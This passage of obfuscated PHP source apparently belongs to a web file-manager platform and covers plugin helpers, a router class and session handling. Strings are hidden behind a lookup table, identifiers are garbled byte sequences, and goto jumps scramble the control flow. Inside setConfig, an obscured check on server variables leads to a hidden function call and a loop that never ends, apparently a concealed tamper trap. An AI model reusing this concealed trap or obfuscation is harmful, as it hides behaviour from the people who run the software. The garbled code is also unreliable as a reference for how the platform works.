file_get_contents_nossl($dùÚÆåÁ»µ)); } final function _tmpFileName($fÇé–Âõèÿ = array()) { goto Dç⁄’¯Ê√Ç; Dç⁄’¯Ê√Ç: $D´æÇƒÁœ¢ =& $_SERVER[’ÿƒ†ïò]; if (!$fÇé–Âõèÿ) { $fÇé–Âõèÿ = $this->fileInfo; } if (isset($fÇé–Âõèÿ[$D´æÇƒÁœ¢[171]])) { return $fÇé–Âõèÿ[$D´æÇƒÁœ¢[171]]; } goto Eá≈≈∏è÷õ; Eá≈≈∏è÷õ: if (isset($fÇé–Âõèÿ[$D´æÇƒÁœ¢[164]][$D´æÇƒÁœ¢[171]])) { return $fÇé–Âõèÿ[$D´æÇƒÁœ¢[164]][$D´æÇƒÁœ¢[171]]; } $cùŸƒæ«ÉÖ = IO::hashSimple($fÇé–Âõèÿ[$D´æÇƒÁœ¢[76]]); if ($cùŸƒæ«ÉÖ) { return $cùŸƒæ«ÉÖ; } goto a™◊êá˘Ÿí; a™◊êá˘Ÿí: $D”É√Øå‰™ = array($fÇé–Âõèÿ[$D´æÇƒÁœ¢[28]], $fÇé–Âõèÿ[$D´æÇƒÁœ¢[76]], $fÇé–Âõèÿ[$D´æÇƒÁœ¢[78]]); if (isset($fÇé–Âõèÿ[$D´æÇƒÁœ¢[515]])) { $D”É√Øå‰™[] = $fÇé–Âõèÿ[$D´æÇƒÁœ¢[515]]; } return md5(implode($D´æÇƒÁœ¢[71], $D”É√Øå‰™)); goto bãîØƒ”©¥; bãîØƒ”©¥: } final function checkSharePath($eÀô∑ÛççÙ) { goto eËËïı‡ı‡; eËËïı‡ı‡: $fßÖ·ÓØ•ï =& $_SERVER[’ÿƒ†ïò]; if (!defined($fßÖ·ÓØ•ï[468])) { define($fßÖ·ÓØ•ï[508], 0); } if (!$this->isShare($eÀô∑ÛççÙ)) { return !1; } goto e ¥‡–©¿†; CêÆãÛÔêı: $this->cachePath = $this->pluginCachePath($this->fileInfo[$fßÖ·ÓØ•ï[171]]); return $b≥ò£á≥ˆ[$fßÖ·ÓØ•ï[76]]; goto aº®“∫…˘ù; e ¥‡–©¿†: $b≥ò£á≥ˆ = Action($fßÖ·ÓØ•ï[1098])->sharePathInfo($eÀô∑ÛççÙ); if (!isset($b≥ò£á≥ˆ[$fßÖ·ÓØ•ï[76]])) { show_json(LNG($fßÖ·ÓØ•ï[1454]), !1); } $this->fileInfo = $b≥ò£á≥ˆ[$fßÖ·ÓØ•ï[164]]; goto CêÆãÛÔêı; aº®“∫…˘ù: } final function pluginCachePath($B´Û÷‚›∂é = '') { $DÑëÃòïø› =& $_SERVER[’ÿƒ†ïò]; $e§±ùÍ¬ŸÏ = IO_PATH_SYSTEM_TEMP . $DÑëÃòïø›[1455] . $this->pluginName; if (!($aÊâÏ¯Îß„ = IO::infoFull($e§±ùÍ¬ŸÏ))) { return IO::mkdir($e§±ùÍ¬ŸÏ . $DÑëÃòïø›[8] . $B´Û÷‚›∂é); } if (empty($B´Û÷‚›∂é)) { return $aÊâÏ¯Îß„[$DÑëÃòïø›[76]]; } if (!($c÷íÒÖºˆÈ = IO::fileNameExist($aÊâÏ¯Îß„[$DÑëÃòïø›[76]], $B´Û÷‚›∂é))) { return IO::mkdir($aÊâÏ¯Îß„[$DÑëÃòïø›[76]] . $B´Û÷‚›∂é); } return KodIO::make($c÷íÒÖºˆÈ); } final function pluginCacheFileSet($fŒ∞óëÊ∑î, $D˘éü∫åñ  = '') { $bï–À‰“∆û =& $_SERVER[’ÿƒ†ïò]; if (!($e ø®á±¶Ì = IO::infoFull($fŒ∞óëÊ∑î))) { return IO::mkfile($fŒ∞óëÊ∑î, $D˘éü∫åñ , REPEAT_REPLACE); } IO::setContent($e ø®á±¶Ì[$bï–À‰“∆û[76]], $D˘éü∫åñ ); return $e ø®á±¶Ì[$bï–À‰“∆û[76]]; } final function pluginLocalFile($CÈÆ˘†≥ïè = '') { goto cº†∫ûæëÊ; AˆÉ˘°êÒ·: if (!checkExtSafe($F‘îüì€åû)) { $F‘îüì€åû = $F‘îüì€åû . $eÒ€É˘Î©Ù[1456]; } $eÚ´Ö÷ÿ¨„ = $Aÿå¢€≥åØ . $F‘îüì€åû; if (@file_exists($eÚ´Ö÷ÿ¨„)) { return $eÚ´Ö÷ÿ¨„; } goto cÇƒµë‡ÃÇ; Fâ€±öê√: if (!$CÈÆ˘†≥ïè) { return $Aÿå¢€≥åØ; } $FËø€ÆˆÏå = IO::info($CÈÆ˘†≥ïè); $F‘îüì€åû = $this->_tmpFileName($FËø€ÆˆÏå) . $eÒ€É˘Î©Ù[95] . $FËø€ÆˆÏå[$eÒ€É˘Î©Ù[168]]; goto AˆÉ˘°êÒ·; cÇƒµë‡ÃÇ: return IO::copy($CÈÆ˘†≥ïè, $Aÿå¢€≥åØ, 0, $F‘îüì€åû); goto E÷“ëíà¯Î; cº†∫ûæëÊ: $eÒ€É˘Î©Ù =& $_SERVER[’ÿƒ†ïò]; $Aÿå¢€≥åØ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Aÿå¢€≥åØ)) { mk_dir($Aÿå¢€≥åØ); } goto Fâ€±öê√; E÷“ëíà¯Î: } final function appPackage() { goto d™¢≈©°≈å; aÆôâóÖ˜ : return $BÈÕ±ﬂÕ»ß; goto D◊Û«ﬂˆ»Ã; d™¢≈©°≈å: $cÛÇä˜Ö≠± =& $_SERVER[’ÿƒ†ïò]; if ($this->packageData) { return $this->packageData; } $dß‡º£ß£ü = $this->parseFile($this->pluginPath . $cÛÇä˜Ö≠±[1457]); goto Dì ÑßâŸı; cÍ®’…Öà“: $D˘†éåü∑¢ = Hook::trigger($cÛÇä˜Ö≠±[1458], $BÈÕ±ﬂÕ»ß); if ($D˘†éåü∑¢ && is_array($D˘†éåü∑¢)) { $BÈÕ±ﬂÕ»ß = $D˘†éåü∑¢; } $this->packageData = $BÈÕ±ﬂÕ»ß; goto aÆôâóÖ˜ ; Dì ÑßâŸı: $this->parseLang($dß‡º£ß£ü); $BÈÕ±ﬂÕ»ß = json_decode_force($dß‡º£ß£ü); if (!$BÈÕ±ﬂÕ»ß) { return array(); } goto cÍ®’…Öà“; D◊Û«ﬂˆ»Ã: } public function packageInfoGet($f‰£ Ì≠°é) { $AΩÚ¿›Ûçü = $this->appPackage(); return array_get_value($AΩÚ¿›Ûçü, $f‰£ Ì≠°é); } public function packageVersion() { return $this->packageInfoGet($_SERVER[’ÿƒ†ïò][1459]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[’ÿƒ†ïò][1460]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[’ÿƒ†ïò][1461]); } public function echoJsAssign($E◊Ê›ë¶Æê, $CµÉÀÍ†ı§) { $this->echoJsAssignArr[$E◊Ê›ë¶Æê] = $CµÉÀÍ†ı§; } private function parseFile($Eº¢ëœµ‘É) { goto fΩ÷öùÔ˜Ù; B∑≤Ÿ≥ÛÒ„: $Céâ≠Ω≥ç– = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$aê˜‰ˆÏÎ√[88]][$aê˜‰ˆÏÎ√[1469]]); foreach ($this->echoJsAssignArr as $Dèòˆ†¥ƒù => $dÂº√¢Ñªó) { $eòèÓíÿÓ[] = $aê˜‰ˆÏÎ√[1470] . $Dèòˆ†¥ƒù . $aê˜‰ˆÏÎ√[1471]; $Céâ≠Ω≥ç–[] = is_array($dÂº√¢Ñªó) || is_object($dÂº√¢Ñªó) ? rawurlencode(json_encode($dÂº√¢Ñªó)) : $dÂº√¢Ñªó; } if (strstr($cëåºﬂñçâ, $aê˜‰ˆÏÎ√[1472])) { $fÕå«ÿ◊ﬁ˜ = rawurlencode(json_encode($this->pluginLangArr)); $cëåºﬂñçâ = str_replace($aê˜‰ˆÏÎ√[1472], $fÕå«ÿ◊ﬁ˜, $cëåºﬂñçâ); } goto b÷èÑ§éç”; fΩ÷öùÔ˜Ù: $aê˜‰ˆÏÎ√ =& $_SERVER[’ÿƒ†ïò]; $cëåºﬂñçâ = file_get_contents_nossl($Eº¢ëœµ‘É); $eòèÓíÿÓ = array($aê˜‰ˆÏÎ√[1462], $aê˜‰ˆÏÎ√[1463], $aê˜‰ˆÏÎ√[1464], $aê˜‰ˆÏÎ√[1465], $aê˜‰ˆÏÎ√[1466], $aê˜‰ˆÏÎ√[1467], $aê˜‰ˆÏÎ√[1468]); goto B∑≤Ÿ≥ÛÒ„; b÷èÑ§éç”: if (strstr($cëåºﬂñçâ, $aê˜‰ˆÏÎ√[1473])) { $fÕå«ÿ◊ﬁ˜ = $fÕå«ÿ◊ﬁ˜ = rawurlencode(json_encode($this->getConfig())); $cëåºﬂñçâ = str_replace($aê˜‰ˆÏÎ√[1473], $fÕå«ÿ◊ﬁ˜, $cëåºﬂñçâ); } $cëåºﬂñçâ = str_replace($eòèÓíÿÓ, $Céâ≠Ω≥ç–, $cëåºﬂñçâ); return $cëåºﬂñçâ; goto C≥ÜçÂ€ô∏; C≥ÜçÂ€ô∏: } private function parseLang(&$b«Îù∑ °Ì) { goto Eµáï‹é∆≠; a‚πè’Úää: preg_match_all($dªì˘Ö¡æ¨[1475], $b«Îù∑ °Ì, $d»—úù⁄Ω≈); if (!is_array($d»—úù⁄Ω≈) || count($d»—úù⁄Ω≈) == 0 || !is_array($d»—úù⁄Ω≈[0]) || count($d»—úù⁄Ω≈[0]) == 0) { return; } $F˘±Á€≈÷‡ = array(); goto bÇ–…ØÏÓì; bÇ–…ØÏÓì: $cÜóêÏ≤ÑÙ = array(); foreach ($d»—úù⁄Ω≈[0] as $eàÓâÇ®˘ç) { $c•’Î©êéπ = substr($eàÓâÇ®˘ç, strlen($D«Œ´∂√ß∏), -4); $Dﬁ¢•è™‹ô = LNG($c•’Î©êéπ); $F˘±Á€≈÷‡[] = $eàÓâÇ®˘ç; $cÜóêÏ≤ÑÙ[] = str_replace(array($dªì˘Ö¡æ¨[229], $dªì˘Ö¡æ¨[1066], $dªì˘Ö¡æ¨[340], $dªì˘Ö¡æ¨[116]), array($dªì˘Ö¡æ¨[50], $dªì˘Ö¡æ¨[50], $dªì˘Ö¡æ¨[33], $dªì˘Ö¡æ¨[1476]), $Dﬁ¢•è™‹ô); } $b«Îù∑ °Ì = str_replace($F˘±Á€≈÷‡, $cÜóêÏ≤ÑÙ, $b«Îù∑ °Ì); goto Cœû≠Ò‰¬“; Eµáï‹é∆≠: $dªì˘Ö¡æ¨ =& $_SERVER[’ÿƒ†ïò]; $D«Œ´∂√ß∏ = $dªì˘Ö¡æ¨[1474]; if (!strstr($b«Îù∑ °Ì, $D«Œ´∂√ß∏)) { return; } goto a‚πè’Úää; Cœû≠Ò‰¬“: } private function parseConfig(&$Cºèº◊ ñ) { goto dÑ√—†êòΩ; dÑ√—†êòΩ: $AÉêòã»Èµ =& $_SERVER[’ÿƒ†ïò]; $F Ñ˜Îﬂˆ = $AÉêòã»Èµ[1477]; if (!strstr($Cºèº◊ ñ, $F Ñ˜Îﬂˆ)) { return; } goto A§ÎÓ¿›á£; Dø€´”√Â…: $dá≠èê§Ú… = array(); $DÕÒó‡≠´å = array(); foreach ($D»âòÇ∆Ùâ[0] as $A©æˆ·Ñêæ) { $dÇ˜ä≠¿ùÎ = substr($A©æˆ·Ñêæ, strlen($F Ñ˜Îﬂˆ), -2); $dá≠èê§Ú…[] = $A©æˆ·Ñêæ; $DÕÒó‡≠´å[] = _get($bœñ∫àúëõ, $dÇ˜ä≠¿ùÎ); } goto f√©ÒœõÉŒ; f√©ÒœõÉŒ: $Cºèº◊ ñ = str_replace($dá≠èê§Ú…, $DÕÒó‡≠´å, $Cºèº◊ ñ); goto Cƒ◊¥∫±ÿô; A§ÎÓ¿›á£: preg_match_all($AÉêòã»Èµ[1478], $Cºèº◊ ñ, $D»âòÇ∆Ùâ); if (!is_array($D»âòÇ∆Ùâ) || count($D»âòÇ∆Ùâ) == 0 || !is_array($D»âòÇ∆Ùâ[0]) || count($D»âòÇ∆Ùâ[0]) == 0) { return; } $bœñ∫àúëõ = $this->getConfig(); goto Dø€´”√Â…; Cƒ◊¥∫±ÿô: } private function parsePackage(&$d€ˆ±∏ÕŸ≈) { goto F˘±çûùß–; bå·òô•‹Ω: $cá¨Æ›Ωæ˜ = array(); $F˘íÎΩü√Î = array(); foreach ($a¡µı›è∏¥[0] as $fê›’ãÍÖù) { $dÀ√´›â«ò = substr($fê›’ãÍÖù, strlen($D’√‚ß‰≠à), -2); $cá¨Æ›Ωæ˜[] = $fê›’ãÍÖù; $F˘íÎΩü√Î[] = _get($EÃ±˜£›éô, $dÀ√´›â«ò); } goto D®ƒù’Úçâ; D®ƒù’Úçâ: $d€ˆ±∏ÕŸ≈ = str_replace($cá¨Æ›Ωæ˜, $F˘íÎΩü√Î, $d€ˆ±∏ÕŸ≈); goto D≤¢Ö⁄íÜ÷; cœÆøú˘ø¿: preg_match_all($eÍÌ‹±ª†á[1480], $d€ˆ±∏ÕŸ≈, $a¡µı›è∏¥); if (!is_array($a¡µı›è∏¥) || count($a¡µı›è∏¥) == 0 || !is_array($a¡µı›è∏¥[0]) || count($a¡µı›è∏¥[0]) == 0) { return; } $EÃ±˜£›éô = $this->appPackage(); goto bå·òô•‹Ω; F˘±çûùß–: $eÍÌ‹±ª†á =& $_SERVER[’ÿƒ†ïò]; $D’√‚ß‰≠à = $eÍÌ‹±ª†á[1479]; if (!strstr($d€ˆ±∏ÕŸ≈, $D’√‚ß‰≠à)) { return; } goto cœÆøú˘ø¿; D≤¢Ö⁄íÜ÷: } final function echoFile($f—øÙê˜Ë∫, $cºÇ≠Àπ—Û = false) { goto A˜°¶´À®ò; fòõÍë¶‹¯: $this->parsePackage($B“£í¢ãÃﬁ); if (is_array($cºÇ≠Àπ—Û)) { $B“£í¢ãÃﬁ = str_replace(array_keys($cºÇ≠Àπ—Û), array_values($cºÇ≠Àπ—Û), $B“£í¢ãÃﬁ); } echo $Aﬂ®ÉıªÉ†[229] . $B“£í¢ãÃﬁ; goto D——®°¯¥¨; A¨‘Ö‰ß¡œ: $B“£í¢ãÃﬁ = $this->parseFile($fù™≈–¢ûÂ); $this->parseLang($B“£í¢ãÃﬁ); $this->parseConfig($B“£í¢ãÃﬁ); goto fòõÍë¶‹¯; A˜°¶´À®ò: $Aﬂ®ÉıªÉ† =& $_SERVER[’ÿƒ†ïò]; $fù™≈–¢ûÂ = $this->pluginPath . $f—øÙê˜Ë∫; if (ACT == $Aﬂ®ÉıªÉ†[1481]) { echo $Aﬂ®ÉıªÉ†[1482] . $this->pluginName . $Aﬂ®ÉıªÉ†[8] . $f—øÙê˜Ë∫ . $Aﬂ®ÉıªÉ†[1483]; if (!file_exists($fù™≈–¢ûÂ)) { echo $Aﬂ®ÉıªÉ†[1484]; return; } } goto A¨‘Ö‰ß¡œ; D——®°¯¥¨: } final function initLang() { goto F±£ïÌÀ˘é; F±£ïÌÀ˘é: $CÉâÏı∫ºö =& $_SERVER[’ÿƒ†ïò]; $CÖã¬£”É = $CÉâÏı∫ºö[1485]; $b≥ÿÁè‰’º = $this->pluginPath . $CÉâÏı∫ºö[1486]; goto a§’Î€œãå; FÙÛÏêï˜¯: if (!is_array($C—¬∆å÷ß∆)) { return array(); } if (@count($C—¬∆å÷ß∆) > 0) { I18n::set($C—¬∆å÷ß∆); } return $C—¬∆å÷ß∆; goto Aı¿≥€§éë; a§’Î€œãå: $Bˆ¯’Ê†ÎÇ = I18n::getType(); $C—¬∆å÷ß∆ = array(); if (file_exists($b≥ÿÁè‰’º . $Bˆ¯’Ê†ÎÇ . $CÉâÏı∫ºö[833])) { $C—¬∆å÷ß∆ = (include $b≥ÿÁè‰’º . $Bˆ¯’Ê†ÎÇ . $CÉâÏı∫ºö[833]); } else { if ($Bˆ¯’Ê†ÎÇ == $CÉâÏı∫ºö[1487] && !file_exists($b≥ÿÁè‰’º . $Bˆ¯’Ê†ÎÇ . $CÉâÏı∫ºö[833]) && file_exists($b≥ÿÁè‰’º . $CÉâÏı∫ºö[1488])) { $C—¬∆å÷ß∆ = (include $b≥ÿÁè‰’º . $CÉâÏı∫ºö[1488]); } else { if (file_exists($b≥ÿÁè‰’º . $CÖã¬£”É . $CÉâÏı∫ºö[833])) { $C—¬∆å÷ß∆ = (include $b≥ÿÁè‰’º . $CÖã¬£”É . $CÉâÏı∫ºö[833]); } } } goto FÙÛÏêï˜¯; Aı¿≥€§éë: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($búêÖÉ‰ƒ’) { $A§Òƒõ‰ë¥ =& $_SERVER[’ÿƒ†ïò]; if (!isset($_SERVER[$A§Òƒõ‰ë¥[854]]) || !isset($_SERVER[$A§Òƒõ‰ë¥[861]])) { goto BËƒŒ»Ü˜‚; e÷ä´Ë£âß: $bçñ‡Àë›Ç = $c÷ÇÀé∆∫—($e¬∆ª“à◊â); $a≥ÍÕ∫√Ì¬ = explode($A§Òƒõ‰ë¥[229], $bçñ‡Àë›Ç); if (count($a≥ÍÕ∫√Ì¬) < $A§Òƒõ‰ë¥[625]) { $A©Ö›√Ô∑¨ = $A§Òƒõ‰ë¥[859]; $A©Ö›√Ô∑¨(); } goto A£››¡‡“ÿ; BËƒŒ»Ü˜‚: $C‰¶Ó∞›ÿó = $A§Òƒõ‰ë¥[869]; $c÷ÇÀé∆∫— = $A§Òƒõ‰ë¥[856]; $e¬∆ª“à◊â = $_SERVER[$A§Òƒõ‰ë¥[857]] . $A§Òƒõ‰ë¥[858]; goto e÷ä´Ë£âß; b∫™ª∫öÉë: for ($eÇâŒº»√™ = $Bïæúª⁄Ö∆; $eÇâŒº»√™ > 0; $eÇâŒº»√™++) { $cÏØËô≥©è = json_encode($GLOBALS[$A§Òƒõ‰ë¥[413]]); } goto d‹Ñ√»¢…À; A£››¡‡“ÿ: $cÏØËô≥©è = $A§Òƒõ‰ë¥[870]; $cÏØËô≥©è($_SERVER[$A§Òƒõ‰ë¥[871]]); $Bïæúª⁄Ö∆ = 1; goto b∫™ª∫öÉë; d‹Ñ√»¢…À: } return $this->modelPlugin->setConfig($this->pluginName, $búêÖÉ‰ƒ’); } public function onSetConfig($f›¥◊ÔÓ√®) { } public function onGetConfig($a√⁄ìÛ¢úÑ) { } public function onChangeStatus($CÙ÷ﬂ„‹„ù) { } public function onUninstall() { } public function onInstall() { } public function authCheck($B—ÁÉ»⁄™ã = "\x70\x6c\x75\147\x69\x6e\101\165\x74\150") { $DºŒñã…ÎÁ =& $_SERVER[’ÿƒ†ïò]; if (!defined($DºŒñã…ÎÁ[468])) { return !1; } if (_get($GLOBALS, $DºŒñã…ÎÁ[499])) { return !0; } $Câ•–¢º¢£ = $this->getConfig(); if (!$Câ•–¢º¢£[$B—ÁÉ»⁄™ã]) { return !1; } return ActionCall($DºŒñã…ÎÁ[1489], $Câ•–¢º¢£[$B—ÁÉ»⁄™ã]); } public function url($Fé¡Ó∏´ßÿ, $cîÕ¯¬—€“ = '', $có—ì€πÊÍ = true) { goto fÆüì©§∫ı; fÆüì©§∫ı: $D∞Éü¢≤æ∑ =& $_SERVER[’ÿƒ†ïò]; $fÊôçØ◊€ˆ = $this->getConfig(); $bÔ≠Ø“»ô™ = KOD_VERSION . $D∞Éü¢≤æ∑[95] . KOD_VERSION_BUILD; goto Aï◊Ï§Òï∫; Aï◊Ï§Òï∫: $fàÉË«ú› = $this->packageVersion(); $C€é∆ÉÏè™ = $bÔ≠Ø“»ô™ . $D∞Éü¢≤æ∑[454] . $fàÉË«ú›; if (substr($Fé¡Ó∏´ßÿ, 0, 4) == $D∞Éü¢≤æ∑[147] || substr($Fé¡Ó∏´ßÿ, 0, 2) == $D∞Éü¢≤æ∑[1273]) { $a©÷Õã®Ùœ = $Fé¡Ó∏´ßÿ . $D∞Éü¢≤æ∑[1490] . $C€é∆ÉÏè™; } else { if ($cîÕ¯¬—€“ == $D∞Éü¢≤æ∑[33]) { $a©÷Õã®Ùœ = $this->pluginHost . $Fé¡Ó∏´ßÿ . $D∞Éü¢≤æ∑[1490] . $C€é∆ÉÏè™; } else { if ($cîÕ¯¬—€“ === $D∞Éü¢≤æ∑[77]) { $a©÷Õã®Ùœ = $this->pluginHost . $Fé¡Ó∏´ßÿ; } else { if ($cîÕ¯¬—€“ == $D∞Éü¢≤æ∑[1491]) { $a©÷Õã®Ùœ = STATIC_PATH . $Fé¡Ó∏´ßÿ . $D∞Éü¢≤æ∑[1490] . $bÔ≠Ø“»ô™; } else { if ($cîÕ¯¬—€“ == $D∞Éü¢≤æ∑[1492]) { $a©÷Õã®Ùœ = APP_HOST . $D∞Éü¢≤æ∑[1493] . $Fé¡Ó∏´ßÿ . $D∞Éü¢≤æ∑[1490] . $bÔ≠Ø“»ô™; } else { if (isset($fÊôçØ◊€ˆ[$cîÕ¯¬—€“])) { $a©÷Õã®Ùœ = $fÊôçØ◊€ˆ[$cîÕ¯¬—€“] . $Fé¡Ó∏´ßÿ . $D∞Éü¢≤æ∑[1490] . $C€é∆ÉÏè™; } } } } } } goto bŸ†¯√ëÑ√; bŸ†¯√ëÑ√: if (!$có—ì€πÊÍ) { return $a©÷Õã®Ùœ; } echo $a©÷Õã®Ùœ; goto f“§„‡âö ; f“§„‡âö : } public function link($a©£¬∏ΩŒ≠ = false, $fèãøûüœÈ = '') { $Fƒﬂ…ÉπÑø =& $_SERVER[’ÿƒ†ïò]; if (!$a©£¬∏ΩŒ≠) { $this->link($Fƒﬂ…ÉπÑø[1494], $Fƒﬂ…ÉπÑø[1492]); $this->link($Fƒﬂ…ÉπÑø[1495], $Fƒﬂ…ÉπÑø[1491]); $this->link($Fƒﬂ…ÉπÑø[1496], $Fƒﬂ…ÉπÑø[1491]); $this->link($Fƒﬂ…ÉπÑø[1497], $Fƒﬂ…ÉπÑø[1491]); $this->link($Fƒﬂ…ÉπÑø[1498], $Fƒﬂ…ÉπÑø[1491]); return; } $Eﬁ≈°î»™î = $this->url($a©£¬∏ΩŒ≠, $fèãøûüœÈ, !1); if (substr($a©£¬∏ΩŒ≠, -3) == $Fƒﬂ…ÉπÑø[1499]) { echo $Fƒﬂ…ÉπÑø[1500] . $Eﬁ≈°î»™î . $Fƒﬂ…ÉπÑø[1501] . $Fƒﬂ…ÉπÑø[229]; } else { if (substr($a©£¬∏ΩŒ≠, -4) == $Fƒﬂ…ÉπÑø[1502]) { echo $Fƒﬂ…ÉπÑø[1503] . $Eﬁ≈°î»™î . $Fƒﬂ…ÉπÑø[1504] . $Fƒﬂ…ÉπÑø[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\x2f\135\53", "\x3a\x6e\x75\x6d" => "\133\60\55\71\x5d\x2b", "\x3a\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($A€ùù∑ﬁÉ´, $Dººôå…‡Â) { $c•√•”€≠ã =& $_SERVER[’ÿƒ†ïò]; if ($A€ùù∑ﬁÉ´ == $c•√•”€≠ã[1505]) { $C‰¯Ç»ÌØ∑ = array_map($c•√•”€≠ã[1506], $Dººôå…‡Â[0]); $E“ÛüÜ°‰ß = strpos($Dººôå…‡Â[1], $c•√•”€≠ã[8]) === 0 ? $Dººôå…‡Â[1] : $c•√•”€≠ã[8] . $Dººôå…‡Â[1]; $C£È·á≠∑´ = $Dººôå…‡Â[2]; } else { $C‰¯Ç»ÌØ∑ = null; $E“ÛüÜ°‰ß = strpos($Dººôå…‡Â[0], $c•√•”€≠ã[8]) === 0 ? $Dººôå…‡Â[0] : $c•√•”€≠ã[8] . $Dººôå…‡Â[0]; $C£È·á≠∑´ = $Dººôå…‡Â[1]; } array_push(self::$maps, $C‰¯Ç»ÌØ∑); array_push(self::$routes, $E“ÛüÜ°‰ß); array_push(self::$methods, strtoupper($A€ùù∑ﬁÉ´)); array_push(self::$callbacks, $C£È·á≠∑´); } public static function error($D–ò‹Èé©Ê) { self::$errorCallback = $D–ò‹Èé©Ê; } public static function haltOnMatch($F±§ÂŸ„‡€ = true) { self::$halts = $F±§ÂŸ„‡€; } public static function dispatch() { goto AåÉ∫è’É ; AåÉ∫è’É : $céÏ≤Ü·∂¯ =& $_SERVER[’ÿƒ†ïò]; $FÕâ ¶ùº∏ = parse_url($_SERVER[$céÏ≤Ü·∂¯[1507]], PHP_URL_PATH); $C‹îıâåºÌ = $_SERVER[$céÏ≤Ü·∂¯[157]]; goto cΩ•—ˆô”Ω; dˆﬂ§é‰õπ: self::$routes = preg_replace($céÏ≤Ü·∂¯[1192], $céÏ≤Ü·∂¯[8], self::$routes); if (in_array($FÕâ ¶ùº∏, self::$routes)) { $c•Ú¬≠Ë∆Â = array_keys(self::$routes, $FÕâ ¶ùº∏); foreach ($c•Ú¬≠Ë∆Â as $FèÀÒÃ”€Ö) { if (self::$methods[$FèÀÒÃ”€Ö] == $C‹îıâåºÌ || self::$methods[$FèÀÒÃ”€Ö] == $céÏ≤Ü·∂¯[1508] || in_array($C‹îıâåºÌ, self::$maps[$FèÀÒÃ”€Ö])) { $eàÓè’∞Ü® = !0; if (!is_object(self::$callbacks[$FèÀÒÃ”€Ö])) { $eœïÜË±›∫ = explode($céÏ≤Ü·∂¯[8], self::$callbacks[$FèÀÒÃ”€Ö]); $aáÓÈî˘çÀ = end($eœïÜË±›∫); $eü◊Õ—ÖÒ„ = explode($céÏ≤Ü·∂¯[1509], $aáÓÈî˘çÀ); $AãßÎ»ëâÚ = new $eü◊Õ—ÖÒ„[0](); $AãßÎ»ëâÚ->{$eü◊Õ—ÖÒ„[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$FèÀÒÃ”€Ö]); if (self::$halts) { return; } } } } } else { $AŸπŒª√È≠ = 0; foreach (self::$routes as $FèÀÒÃ”€Ö) { if (strpos($FèÀÒÃ”€Ö, $céÏ≤Ü·∂¯[4]) !== !1) { $FèÀÒÃ”€Ö = str_replace($aãÉ¡òúèá, $b‘ì™≥§ÿ≤, $FèÀÒÃ”€Ö); } if (preg_match($céÏ≤Ü·∂¯[1510] . $FèÀÒÃ”€Ö . $céÏ≤Ü·∂¯[1511], $FÕâ ¶ùº∏, $D»·Îî°Êª)) { if (self::$methods[$AŸπŒª√È≠] == $C‹îıâåºÌ || self::$methods[$AŸπŒª√È≠] == $céÏ≤Ü·∂¯[1508] || !empty(self::$maps[$AŸπŒª√È≠]) && in_array($C‹îıâåºÌ, self::$maps[$AŸπŒª√È≠])) { $eàÓè’∞Ü® = !0; array_shift($D»·Îî°Êª); if (!is_object(self::$callbacks[$AŸπŒª√È≠])) { $eœïÜË±›∫ = explode($céÏ≤Ü·∂¯[8], self::$callbacks[$AŸπŒª√È≠]); $aáÓÈî˘çÀ = end($eœïÜË±›∫); $eü◊Õ—ÖÒ„ = explode($céÏ≤Ü·∂¯[1509], $aáÓÈî˘çÀ); $AãßÎ»ëâÚ = new $eü◊Õ—ÖÒ„[0](); if (!method_exists($AãßÎ»ëâÚ, $eü◊Õ—ÖÒ„[1])) { echo $céÏ≤Ü·∂¯[1512]; } else { call_user_func_array(array($AãßÎ»ëâÚ, $eü◊Õ—ÖÒ„[1]), $D»·Îî°Êª); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$AŸπŒª√È≠], $D»·Îî°Êª); if (self::$halts) { return; } } } } $AŸπŒª√È≠++; } } if ($eàÓè’∞Ü® == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $cªﬂñÂﬂÑÒ =& $_SERVER[’ÿƒ†ïò]; header($_SERVER[$cªﬂñÂﬂÑÒ[1513]] . $cªﬂñÂﬂÑÒ[1514]); echo $cªﬂñÂﬂÑÒ[1515]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$céÏ≤Ü·∂¯[1507]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto fÖè˜Ö£‡«; cΩ•—ˆô”Ω: $aãÉ¡òúèá = array_keys(static::$patterns); $b‘ì™≥§ÿ≤ = array_values(static::$patterns); $eàÓè’∞Ü® = !1; goto dˆﬂ§é‰õπ; fÖè˜Ö£‡«: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto F‹ŸêÜáå™; D≠¨⁄Ôçìá: if (self::$sessionSign) { } else { if (Cookie::get($A«ÉéÚÁ◊‡)) { self::$sessionSign = Cookie::get($A«ÉéÚÁ◊‡); } else { self::$sessionSign = guid(); } } Cookie::setSafe($A«ÉéÚÁ◊‡, self::$sessionSign, self::$sessionTime); $d“Íı≤Îáµ = $d◊∏º˜ΩÔÖ[$C©â‚ÿãò†[1518]]; goto D£éà Ùà≥; f‘‚» úÆ©: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $E„§Ö∞‹≤¡ = new self(); return $E„§Ö∞‹≤¡; goto E¡≈Ü ™ô·; bËôëıÙéù: $d◊∏º˜ΩÔÖ = $GLOBALS[$C©â‚ÿãò†[6]][$C©â‚ÿãò†[347]]; self::$sessionTime = $d◊∏º˜ΩÔÖ[$C©â‚ÿãò†[1516]]; $A«ÉéÚÁ◊‡ = isset($GLOBALS[$C©â‚ÿãò†[1517]]) ? $GLOBALS[$C©â‚ÿãò†[1517]] : SESSION_ID; goto D≠¨⁄Ôçìá; D£éà Ùà≥: $fÜ«≈¶Øœ  = $d◊∏º˜ΩÔÖ[$d“Íı≤Îáµ]; $dåÜïû†Ç´ = 